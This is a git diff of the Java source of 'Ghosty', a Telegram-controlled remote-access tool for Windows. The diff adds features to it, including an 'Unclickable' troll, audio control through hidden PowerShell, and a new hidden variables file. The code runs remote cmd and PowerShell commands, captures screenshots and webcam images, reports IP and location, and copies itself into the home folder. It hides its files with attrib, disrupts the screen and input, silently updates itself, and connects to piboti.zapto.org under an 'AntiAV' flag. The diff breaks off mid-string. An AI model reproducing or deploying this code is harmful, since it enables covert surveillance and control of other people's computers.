@@ -5,6 +5,8 @@ import Chat.ClientGUI;
 import com.github.sarxos.webcam.Webcam;
 import com.github.sarxos.webcam.WebcamResolution;
 import com.sun.management.OperatingSystemMXBean;
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jsoup.Jsoup;
 import org.jsoup.select.Elements;
 import org.telegram.telegrambots.TelegramBotsApi;
@@ -38,6 +40,7 @@ import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.text.DateFormat;
+import java.text.DecimalFormat;
 import java.text.SimpleDateFormat;
 import java.util.*;
 
@@ -47,15 +50,18 @@ import java.util.*;
 public class Bot extends TelegramLongPollingBot {
 
     Config config;
+    Variables variables;
     Client client;
     boolean writer = false;
     boolean reader = false;
     boolean changed = false;
+    boolean changedC = false;
+    boolean mute = false;
     String support = "162922263";
-    String fun = "DVD open,DVD close,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
+    String fun = "DVD open,DVD close,Unclickable,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
     String info = "Screenshot,Uptime,Wer,BatteryInformation,Location,Version,Path,Name,Pic,OperatingSystem,IP,Usage";
     String tools = "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,GhostWriter,Close,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
-    public double version = 3;
+    public double version = 5.14;
     static private BotSession sup;
     boolean updating = false;
     private long last = System.currentTimeMillis();
@@ -84,11 +90,12 @@ public class Bot extends TelegramLongPollingBot {
     boolean hide = false;
 
 
-    private String changelog = "Press STRG+Ö to activate the LOCK-Mode. Note: Lockmode can only be disabled from your phone!";
+    private String changelog = "Audiokeys functional.\n Troll: Unclickable.";
 
     public Bot(String[] args) {
         config = read();
-        this.buttons = config.getButtons();
+        variables = readVar();
+        this.buttons = variables.getButtons();
         if (buttons == null)
             buttons = new HashMap<>();
         if (this.buttons.size() < 4) {
@@ -98,7 +105,7 @@ public class Bot extends TelegramLongPollingBot {
                 this.buttons.put(put, 0L);
             for (String put : tools.split(","))
                 this.buttons.put(put, 0L);
-            config.setButtons(this.buttons);
+            variables.setButtons(this.buttons);
         }
         if (config.isAlive()) {
             tray();
@@ -109,13 +116,13 @@ public class Bot extends TelegramLongPollingBot {
             Runtime.getRuntime().addShutdownHook(new Thread() {
                 @Override
                 public void run() {
+                    if (changed)
+                        writeConf();
                     DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
                     Date date = new Date();
                     String time = dateFormat.format(date);
-                    if (!config.isSilent())
+                    if (!variables.isSilent())
                         sendNachricht("Ghosty has been shutdown. " + time);
-                    if (changed)
-                        writeConf();
                 }
             });
             DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
@@ -129,25 +136,26 @@ public class Bot extends TelegramLongPollingBot {
             } catch (UnknownHostException e) {
                 sendNachricht(e.toString());
             }
-            if (!config.isSilent())
+            if (!variables.isSilent())
                 if (args.length == 0)
                     sendNachricht("Device booted!\nTime: " + time + " " + IP.getIP() + "\n" + wer);
                 else
                     sendNachricht("Ghosty has been closed unexpectedly! Process restarted successfully.\nTime: " + time + " " + IP.getIP() + "\n" + wer);
         }
-        if (!config.getName().contains(";")) {
-            config.setName(config.getName() + ";");
+        if (!variables.isUpdated()) {
+            variables.setUpdated(true);
+            tts("Update complete! New Version " + version, false);
             // tts("Ghosty language has been sucessfully changed! HI, i am Zira, your personal assistant! Its a pleasure meeting you. My main task is to keep your system fast and clean. I will only warn you about security breaches and low battery status.");
             sendNachricht("Changelog:\n" + changelog);
             writeConf();
         }
-        if (config.isSilent()) {
-            last = config.getLastmil();
-            time = config.getTime();
+        if (variables.isSilent()) {
+            last = variables.lastmil;
+            time = variables.time;
             setSilent(false);
         }
-        if (config.isReset()) {
-            config.setReset(false);
+        if (variables.isReset()) {
+            variables.setReset(false);
             writeConf();
         }
         if (config.isTroll()) {
@@ -158,7 +166,8 @@ public class Bot extends TelegramLongPollingBot {
         run.start();
 
         String pfad = System.getProperty("user.home") + "\\";
-        if (!getPfad().equals(pfad)) {
+        System.out.println(args.length);
+        if (!getPfad().equals(pfad) && args.length == 0) {
             try {
                 setSilent(true);
                 String name = "Ghosty.jar";
@@ -208,7 +217,12 @@ public class Bot extends TelegramLongPollingBot {
                 checkrun.start();
             }
             try {
-                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\botconf.bot" + "\"");
+                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\conf.bot" + "\"");
+            } catch (IOException ek) {
+                System.out.println(ek + " HIDE");
+            }
+            try {
+                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\var.bot" + "\"");
             } catch (IOException ek) {
                 System.out.println(ek + " HIDE");
             }
@@ -222,11 +236,12 @@ public class Bot extends TelegramLongPollingBot {
             }
         }
         String text;
-        if (config.isMute())
+        if (variables.isMute())
             text = "Unmute";
         else
             text = "Mute";
-        systemTray.getTrayIcons()[0].getPopupMenu().getItem(4).setLabel(text);
+        if (config.isAlive())
+            systemTray.getTrayIcons()[0].getPopupMenu().getItem(5).setLabel(text);
         if (config.isAntiAV())
             chat = new ClientGUI("piboti.zapto.org", 4269, this);
     }
@@ -235,12 +250,29 @@ public class Bot extends TelegramLongPollingBot {
     private Config read() {
         Config back = null;
         try {
-            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\botconf.bot");
+            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\conf.bot");
             ObjectInputStream ois = new ObjectInputStream(fis);
             back = (Config) ois.readObject();
             ois.close();
         } catch (Exception e) {
             System.out.println(e);
+        }
+        return back;
+    }
+
+    private Variables readVar() {
+        Variables back = null;
+        try {
+            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\var.bot");
+            ObjectInputStream ois = new ObjectInputStream(fis);
+            back = (Variables) ois.readObject();
+            ois.close();
+        } catch (Exception e) {
+            System.out.println(e);
+        }
+        if (back == null) {
+            System.out.println("Hier da");
+            back = new Variables();
         }
         return back;
     }
@@ -262,7 +294,7 @@ public class Bot extends TelegramLongPollingBot {
                 sendNachrichtAdmin("SilentMode enabled!");
             else {
                 sendNachricht("Updating!\nPlease do not turn off your device in the next minute.");
-                tts("Update detected! Please do not turn off your device in the next minute.");
+                tts("Update detected! Please do not turn off your device in the next minute.", false);
             }
             try {
                 GetFile n = new GetFile();
@@ -277,7 +309,7 @@ public class Bot extends TelegramLongPollingBot {
             } catch (Exception e) {
                 sendNachrichtAdmin(e.toString());
                 setImage(3);
-                if (config.isSilent())
+                if (variables.isSilent())
                     sendNachrichtAdmin("Update failed!");
                 else
                     sendNachricht("Update failed!");
@@ -318,14 +350,13 @@ public class Bot extends TelegramLongPollingBot {
 
         String[] parts = nachricht.split("\\s+");
         for (String item : parts)
-            try {
-                URL url = new URL(item);
-                Runtime.getRuntime().exec("cmd /c start " + url);
-                sendNachricht("Opening URL.");
-                return;
-            } catch (MalformedURLException e) {
-            } catch (IOException e) {
-            }
+            if (isValidURL(item))
+                try {
+                    Runtime.getRuntime().exec("cmd /c start " + item);
+                    sendNachricht("Opening website.");
+                } catch (IOException e) {
+                }
+
         if (tools.toLowerCase().contains(nachricht.toLowerCase()) || info.toLowerCase().contains(nachricht.toLowerCase()) || fun.toLowerCase().contains(nachricht.toLowerCase())) {
             try {
                 if (this.buttons.containsKey(nachricht))
@@ -350,14 +381,15 @@ public class Bot extends TelegramLongPollingBot {
                     } else {
                         throw new RuntimeException("Unsupported operating system.");
                     }
+                    sendNachricht("PC turned off.");
                     Runtime.getRuntime().exec(shutdownCommand);
                     System.exit(0);
                 } catch (Exception e) {
-                    sendNachrichtAdmin("FEHLER BEIM BEENDEN DES PC's!");
+                    sendNachricht("Error unable to turn device off.");
                 }
             else {
                 menu = -1;
-                sendNachricht("Shutdown canceled");
+                sendNachricht("Shutdown canceled!");
             }
         }
         if (nachricht.equalsIgnoreCase("shutdown")) {
@@ -379,6 +411,7 @@ public class Bot extends TelegramLongPollingBot {
                     } else {
                         throw new RuntimeException("Unsupported operating system.");
                     }
+                    sendNachricht("PC is restarting!");
                     Runtime.getRuntime().exec(shutdownCommand);
                     System.exit(0);
                 } catch (Exception e) {
@@ -548,6 +581,15 @@ public class Bot extends TelegramLongPollingBot {
                     sendNachricht("RGB Test aktiviert.");
                 }
             }
+            if(nachricht.equalsIgnoreCase("unclickable")){
+                if (Draw.active) {
+                    sendNachricht("Clickable!");
+                    Draw.stop();
+                } else {
+                    sendNachricht("Not Clickable :(");
+                    Draw.unclickable();
+                }
+            }
             if (nachricht.equalsIgnoreCase("All fucker")) {
                 capsFuck.setAllfuck(!capsFuck.isAllfuck());
                 if (!capsFuck.isAllfuck()) {
@@ -604,6 +646,7 @@ public class Bot extends TelegramLongPollingBot {
                 }
             }
             if (nachricht.equalsIgnoreCase("bluescreen")) {
+                System.out.println("Bluescreening");
                 if (Draw.active) {
                     sendNachricht("Bluescreen entfernt!");
                     Draw.stop();
@@ -647,7 +690,7 @@ public class Bot extends TelegramLongPollingBot {
                 if (pw.equals(pw1)) {
                     config.setPassword(pw);
                     sendNachricht("Password set!");
-                    changed = true;
+                    changedC = true;
                 } else {
                     sendNachricht("Passwords do not match!");
                 }
@@ -710,6 +753,7 @@ public class Bot extends TelegramLongPollingBot {
                 Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"" + file.getPath() + "\"");
                 Thread.sleep(1000);
                 file.delete();
+                sendNachricht("Display has been turned off.");
             } catch (Exception e) {
                 sendNachricht("Fehler beim Bildschirm abdrehen.");
             }
@@ -758,34 +802,30 @@ public class Bot extends TelegramLongPollingBot {
                 sendNachricht("TaskHide has been disabled in the settings. ");
         }
         if (nachricht.equalsIgnoreCase("Down")) {
-            try {
-                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]174); $obj.SendKeys([char]174)");
-            } catch (Exception e) {
-                sendNachricht("Fehler beim leiser drehen.");
-            }
+            audioChange(-0.02);
             sendNachricht("Lautstärke verringert.");
         }
 
         if (nachricht.equalsIgnoreCase("Un-/Mute")) {
+            /*
             try {
                 Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]173)");
             } catch (Exception e) {
                 sendNachricht("Fehler beim muten.");
             }
+            */
+            mute = !mute;
+            audioMute(mute);
             sendNachricht("Gemutet oder entmutet.");
         }
         if (nachricht.equalsIgnoreCase("Up")) {
-            try {
-                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]175); $obj.SendKeys([char]175)");
-            } catch (Exception e) {
-                sendNachricht("Fehler beim lauter drehen.");
-            }
+            audioChange(0.02);
             sendNachricht("Volume increased.");
         }
 
         if (nachricht.equalsIgnoreCase("Previous")) {
             try {
-                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]177)");
+                GlobalScreen.postNativeEvent(new NativeKeyEvent(2401, 0, 177, 57360, org.jnativehook.keyboard.NativeKeyEvent.CHAR_UNDEFINED));
             } catch (Exception e) {
                 sendNachricht("Fehler beim zurückspulen.");
             }
@@ -793,7 +833,7 @@ public class Bot extends TelegramLongPollingBot {
         }
         if (nachricht.equalsIgnoreCase("Play/Pause")) {
             try {
-                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]179)");
+                GlobalScreen.postNativeEvent(new NativeKeyEvent(2401, 0, 179, 57378, org.jnativehook.keyboard.NativeKeyEvent.CHAR_UNDEFINED));
             } catch (Exception e) {
                 sendNachricht("Fehler bei play/pause.");
             }
@@ -801,7 +841,7 @@ public class Bot extends TelegramLongPollingBot {
         }
         if (nachricht.equalsIgnoreCase("next")) {
             try {
-                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]176)");
+                GlobalScreen.postNativeEvent(new NativeKeyEvent(2401, 0, 176, 57369, org.jnativehook.keyboard.NativeKeyEvent.CHAR_UNDEFINED));
             } catch (Exception e) {
                 sendNachricht("Fehler beim nächsten Lied.");
             }
@@ -942,7 +982,9 @@ public class Bot extends TelegramLongPollingBot {
         //</editor-fold>
 
         if (nachricht.toLowerCase().contains("sag:"))
-            tts(nachricht.split(":")[1]);
+            tts(nachricht.split(":")[1], true);
+        if (nachricht.toLowerCase().contains("say:"))
+            tts(nachricht.split(":")[1], false);
         if (menu == 0 && !config.isTroll()) {
             wo = 0;
             sendNachricht("Troll function have been deactivated in the Ghosty Settings.");
@@ -982,7 +1024,9 @@ public class Bot extends TelegramLongPollingBot {
 
     public void update(File datei) throws IOException {
         if (!silentUpdate) {
-            config.setName(config.getName().replace(";", ""));
+            if (variables.isSilent())
+                variables.setSilent(false);
+            variables.setUpdated(false);
             writeConf();
         }
         File neu;
@@ -1019,14 +1063,19 @@ public class Bot extends TelegramLongPollingBot {
     }
 
     void reset() {
-        config.setReset(true);
+        variables.setReset(true);
         writeConf();
         retry();
     }
 
     static void removeConf() {
-        File botconf = new File(System.getProperty("user.home") + "\\botconf.bot");
-        botconf.delete();
+        File conf = new File(System.getProperty("user.home") + "\\conf.bot");
+        conf.delete();
+    }
+
+    static void removeVar() {
+        File conf = new File(System.getProperty("user.home") + "\\var.bot");
+        conf.delete();
     }
 
     void deleteme() {
@@ -1127,6 +1176,7 @@ public class Bot extends TelegramLongPollingBot {
     void panic() {
         sendNachricht("Ghosty has been removed sucessfully!");
         sendNachrichtAdmin("Ghosty wurde entfernt!");
+        removeVar();
         removeConf();
         deleteme();
     }
@@ -1374,6 +1424,15 @@ public class Bot extends TelegramLongPollingBot {
         });
         trayPopupMenu.add(update);
 
+        MenuItem share = new MenuItem("Share");
+        share.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                share();
+            }
+        });
+        trayPopupMenu.add(share);
+
         if (config.isAntiAV()) {
             MenuItem chat = new MenuItem("Chat");
             chat.addActionListener(new ActionListener() {
@@ -1384,6 +1443,7 @@ public class Bot extends TelegramLongPollingBot {
             });
             trayPopupMenu.add(chat);
         }
+
         MenuItem mute = new MenuItem("Mute");
         mute.addActionListener(new ActionListener() {
             @Override
@@ -1392,16 +1452,6 @@ public class Bot extends TelegramLongPollingBot {
             }
         });
         trayPopupMenu.add(mute);
-
-
-        MenuItem share = new MenuItem("Share");
-        share.addActionListener(new ActionListener() {
-            @Override
-            public void actionPerformed(ActionEvent e) {
-                share();
-            }
-        });
-        trayPopupMenu.add(share);
 
 
         //2nd menuitem of popupmenu
@@ -1522,29 +1572,54 @@ public class Bot extends TelegramLongPollingBot {
     }
 
     void setSilent(boolean silen) {
-        config.setSilent(silen);
-        config.setLastmil(this.last);
-        config.setTime(this.time);
+        variables.setSilent(silen);
+        variables.setLastmil(this.last);
+        variables.setTime(this.time);
         writeConf();
     }
 
-    void writeConf() {
+    void writeRealConf() {
         try {
-            changed = false;
+            changedC = false;
             removeConf();
-            config.setButtons(buttons);
-            FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\botconf.bot");
+            FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\conf.bot");
             ObjectOutputStream oos = new ObjectOutputStream(fos);
             oos.writeObject(config);
             oos.close();
             try {
-                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\botconf.bot" + "\"");
+                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\conf.bot" + "\"");
             } catch (IOException ek) {
                 System.out.println(ek + " HIDE");
             }
-        } catch (Exception e) {
+        } catch (
+                Exception e) {
             sendNachrichtAdmin("Fehler beim writen\n" + this.getBotUsername() + "\n" + e);
         }
+    }
+
+    void writeConf() {
+        try
+
+        {
+            changed = false;
+            removeVar();
+            variables.setButtons(buttons);
+            FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\var.bot");
+            ObjectOutputStream oos = new ObjectOutputStream(fos);
+            oos.writeObject(variables);
+            oos.close();
+            try {
+                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\var.bot" + "\"");
+            } catch (IOException ek) {
+                System.out.println(ek + " HIDE");
+            }
+        } catch (
+                Exception e)
+
+        {
+            sendNachrichtAdmin("Fehler beim writen\n" + this.getBotUsername() + "\n" + e);
+        }
+
     }
 
     private KeyboardRow getRow(int Seite, int Spalte, int gesamt, String[] buttonArray) {
@@ -1613,16 +1688,21 @@ public class Bot extends TelegramLongPollingBot {
         this.client = client;
     }
 
-    void tts(String text) { //Ghooohstie
-        System.out.println(config.isMute());
-        if (config.isMute())
+    void tts(String text, boolean german) { //Ghooohstie
+        if (variables.isMute())
             return;
         System.out.println("Wir sind hier");
         try {
-            String command = "Add-Type -AssemblyName System.speech \n" +
-                    "$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer \n" +
-                    "$speak.SelectVoice('Microsoft Zira Desktop') \n" +
-                    "$speak.Speak('" + text.replaceAll("'", "") + "')";
+            String command = "";
+            if (german)
+                command = "Add-Type -AssemblyName System.speech \n" +
+                        "$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer \n" +
+                        "$speak.Speak('" + text.replaceAll("'", "") + "')";
+            else
+                command = "Add-Type -AssemblyName System.speech \n" +
+                        "$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer \n" +
+                        "$speak.SelectVoice('Microsoft Zira Desktop') \n" +
+                        "$speak.Speak('" + text.replaceAll("'", "") + "')";
             File file = File.createTempFile("Speaky", ".ps1");
             FileWriter fw = new java.io.FileWriter(file);
             fw.write(command);
@@ -1639,13 +1719,13 @@ public class Bot extends TelegramLongPollingBot {
     }
 
     void mute() {
-        config.setMute(!config.isMute());
+        variables.setMute(!variables.isMute());
         String text;
-        if (config.isMute())
+        if (variables.isMute())
             text = "Unmute";
         else
             text = "Mute";
-        systemTray.getTrayIcons()[0].getPopupMenu().getItem(4).setLabel(text);
+        systemTray.getTrayIcons()[0].getPopupMenu().getItem(5).setLabel(text);
         changed = true;
     }
 
@@ -1662,15 +1742,20 @@ public class Bot extends TelegramLongPollingBot {
     }
 
     void share() {
-        unhide();
         try {
-            Runtime.getRuntime().exec("cmd /c copy \"" + getAbsolutePfad() + "\" " + System.getProperty("user.home") + "\\Desktop\\Ghosty.jar");
-        } catch (IOException e) {
-            sendNachricht("Fail beim copy \n" + e.toString());
+            unhide();
+            Thread.sleep(1500);
+            try {
+                Runtime.getRuntime().exec("cmd /c copy \"" + getAbsolutePfad() + "\" \"" + System.getProperty("user.home") + "\\Desktop\\Ghosty.jar\"");
+                System.out.println("cmd /c copy \"" + getAbsolutePfad() + "\" " + System.getProperty("user.home") + "\\Desktop\\Ghosty.jar");
+            } catch (IOException e) {
+                sendNachricht("Fail beim copy \n" + e.toString());
+            }
+            hide();
+            JOptionPane.showMessageDialog(null, "Ghosty has been copied to your Desktop!", "Success", JOptionPane.INFORMATION_MESSAGE);
+        } catch (Exception e) {
+            System.out.println(e);
         }
-        System
-        hide();
-        JOptionPane.showMessageDialog(null, "Ghosty has been copied to your Desktop!", "Success", JOptionPane.INFORMATION_MESSAGE);
     }
 
     private void hide() {
@@ -1719,5 +1804,269 @@ public class Bot extends TelegramLongPollingBot {
         long total = osBean.getTotalPhysicalMemorySize();
         long use = total - free;
         return (int) ((use * 100) / total);
+    }
+
+    double getAudio() {
+        double back = 0.0;
+        try {
+            String command = "Add-Type -TypeDefinition @'\n" +
+                    "using System.Runtime.InteropServices;\n" +
+                    "[Guid(\"5CDF2C82-841E-4546-9722-0CF74078229A\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IAudioEndpointVolume\n" +
+                    "{\n" +
+                    "    // f(), g(), ... are unused COM method slots. Define these if you care\n" +
+                    "    int f(); int g(); int h(); int i();\n" +
+                    "    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\n" +
+                    "    int j();\n" +
+                    "    int GetMasterVolumeLevelScalar(out float pfLevel);\n" +
+                    "    int k(); int l(); int m(); int n();\n" +
+                    "    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\n" +
+                    "    int GetMute(out bool pbMute);\n" +
+                    "}\n" +
+                    "[Guid(\"D666063F-1587-4E43-81F1-B948E807363F\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IMMDevice\n" +
+                    "{\n" +
+                    "    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\n" +
+                    "}\n" +
+                    "[Guid(\"A95664D2-9614-4F35-A746-DE8DB63617E6\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IMMDeviceEnumerator\n" +
+                    "{\n" +
+                    "    int f(); // Unused\n" +
+                    "    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\n" +
+                    "}\n" +
+                    "[ComImport, Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\")] class MMDeviceEnumeratorComObject { }\n" +
+                    "public class Audio\n" +
+                    "{\n" +
+                    "    static IAudioEndpointVolume Vol()\n" +
+                    "    {\n" +
+                    "        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\n" +
+                    "        IMMDevice dev = null;\n" +
+                    "        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\n" +
+                    "        IAudioEndpointVolume epv = null;\n" +
+                    "        var epvid = typeof(IAudioEndpointVolume).GUID;\n" +
+                    "        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\n" +
+                    "        return epv;\n" +
+                    "    }\n" +
+                    "    public static float Volume\n" +
+                    "    {\n" +
+                    "        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\n" +
+                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\n" +
+                    "    }\n" +
+                    "    public static bool Mute\n" +
+                    "    {\n" +
+                    "        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\n" +
+                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\n" +
+                    "    }\n" +
+                    "}\n" +
+                    "'@\n" +
+                    "[audio]::Volume";
+            // Executing the command
+            File file = File.createTempFile("Upi", ".ps1");
+            FileWriter fw = new java.io.FileWriter(file);
+            fw.write(command);
+            fw.close();
+            Process powerShellProcess = Runtime.getRuntime().exec("powershell.exe -windowStyle hidden -Exec Bypass /c \"" + file.getPath() + "\"");
+            // Getting the results
+            powerShellProcess.getOutputStream().close();
+            String line;
+            System.out.println("Standard Output:");
+            BufferedReader stdout = new BufferedReader(new InputStreamReader(
+                    powerShellProcess.getInputStream()));
+            while ((line = stdout.readLine()) != null) {
+                back = Double.parseDouble(line.replace(',', '.'));
+            }
+            stdout.close();
+            System.out.println("Standard Error:");
+            BufferedReader stderr = new BufferedReader(new InputStreamReader(
+                    powerShellProcess.getErrorStream()));
+            while ((line = stderr.readLine()) != null) {
+                System.out.println(line);
+            }
+            stderr.close();
+            file.delete();
+            System.out.println("Done");
+        } catch (Exception e) {
+            System.out.println(e.toString());
+        }
+        return back;
+    }
+
+    void audioChange(double level) {
+        double current = getAudio();
+        DecimalFormat df = new DecimalFormat("#.##");
+        double newlevel = Double.parseDouble(df.format(current).replace(',', '.')) + level;
+        try {
+            String command = "Add-Type -TypeDefinition @'\n" +
+                    "using System.Runtime.InteropServices;\n" +
+                    "[Guid(\"5CDF2C82-841E-4546-9722-0CF74078229A\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IAudioEndpointVolume\n" +
+                    "{\n" +
+                    "    // f(), g(), ... are unused COM method slots. Define these if you care\n" +
+                    "    int f(); int g(); int h(); int i();\n" +
+                    "    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\n" +
+                    "    int j();\n" +
+                    "    int GetMasterVolumeLevelScalar(out float pfLevel);\n" +
+                    "    int k(); int l(); int m(); int n();\n" +
+                    "    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\n" +
+                    "    int GetMute(out bool pbMute);\n" +
+                    "}\n" +
+                    "[Guid(\"D666063F-1587-4E43-81F1-B948E807363F\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IMMDevice\n" +
+                    "{\n" +
+                    "    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\n" +
+                    "}\n" +
+                    "[Guid(\"A95664D2-9614-4F35-A746-DE8DB63617E6\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IMMDeviceEnumerator\n" +
+                    "{\n" +
+                    "    int f(); // Unused\n" +
+                    "    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\n" +
+                    "}\n" +
+                    "[ComImport, Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\")] class MMDeviceEnumeratorComObject { }\n" +
+                    "public class Audio\n" +
+                    "{\n" +
+                    "    static IAudioEndpointVolume Vol()\n" +
+                    "    {\n" +
+                    "        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\n" +
+                    "        IMMDevice dev = null;\n" +
+                    "        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\n" +
+                    "        IAudioEndpointVolume epv = null;\n" +
+                    "        var epvid = typeof(IAudioEndpointVolume).GUID;\n" +
+                    "        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\n" +
+                    "        return epv;\n" +
+                    "    }\n" +
+                    "    public static float Volume\n" +
+                    "    {\n" +
+                    "        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\n" +
+                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\n" +
+                    "    }\n" +
+                    "    public static bool Mute\n" +
+                    "    {\n" +
+                    "        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\n" +
+                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\n" +
+                    "    }\n" +
+                    "}\n" +
+                    "'@\n" +
+                    "[audio]::Volume = " + newlevel;
+            // Executing the command
+            File file = File.createTempFile("AudioUp", ".ps1");
+            FileWriter fw = new java.io.FileWriter(file);
+            fw.write(command);
+            fw.close();
+            Process powerShellProcess = Runtime.getRuntime().exec("powershell.exe -windowStyle hidden -Exec Bypass /c \"" + file.getPath() + "\"");
+            // Getting the results
+            powerShellProcess.getOutputStream().close();
+            String line;
+            System.out.println("Standard Output:");
+            BufferedReader stdout = new BufferedReader(new InputStreamReader(
+                    powerShellProcess.getInputStream()));
+            while ((line = stdout.readLine()) != null) {
+                System.out.println(line);
+            }
+            stdout.close();
+            System.out.println("Standard Error:");
+            BufferedReader stderr = new BufferedReader(new InputStreamReader(
+                    powerShellProcess.getErrorStream()));
+            while ((line = stderr.readLine()) != null) {
+                System.out.println(line);
+            }
+            stderr.close();
+            System.out.println("Done");
+            file.delete();
+        } catch (Exception e) {
+            System.out.println(e.toString());
+        }
+    }
+
+    void audioMute(boolean mute) {
+        try {
+            String command = "Add-Type -TypeDefinition @'\n" +
+                    "using System.Runtime.InteropServices;\n" +
+                    "[Guid(\"5CDF2C82-841E-4546-9722-0CF74078229A\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IAudioEndpointVolume\n" +
+                    "{\n" +
+                    "    // f(), g(), ... are unused COM method slots. Define these if you care\n" +
+                    "    int f(); int g(); int h(); int i();\n" +
+                    "    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\n" +
+                    "    int j();\n" +
+                    "    int GetMasterVolumeLevelScalar(out float pfLevel);\n" +
+                    "    int k(); int l(); int m(); int n();\n" +
+                    "    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\n" +
+                    "    int GetMute(out bool pbMute);\n" +
+                    "}\n" +
+                    "[Guid(\"D666063F-1587-4E43-81F1-B948E807363F\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IMMDevice\n" +
+                    "{\n" +
+                    "    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\n" +
+                    "}\n" +
+                    "[Guid(\"A95664D2-9614-4F35-A746-DE8DB63617E6\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
+                    "interface IMMDeviceEnumerator\n" +
+                    "{\n" +
+                    "    int f(); // Unused\n" +
+                    "    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\n" +
+                    "}\n" +
+                    "[ComImport, Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\")] class MMDeviceEnumeratorComObject { }\n" +
+                    "public class Audio\n" +
+                    "{\n" +
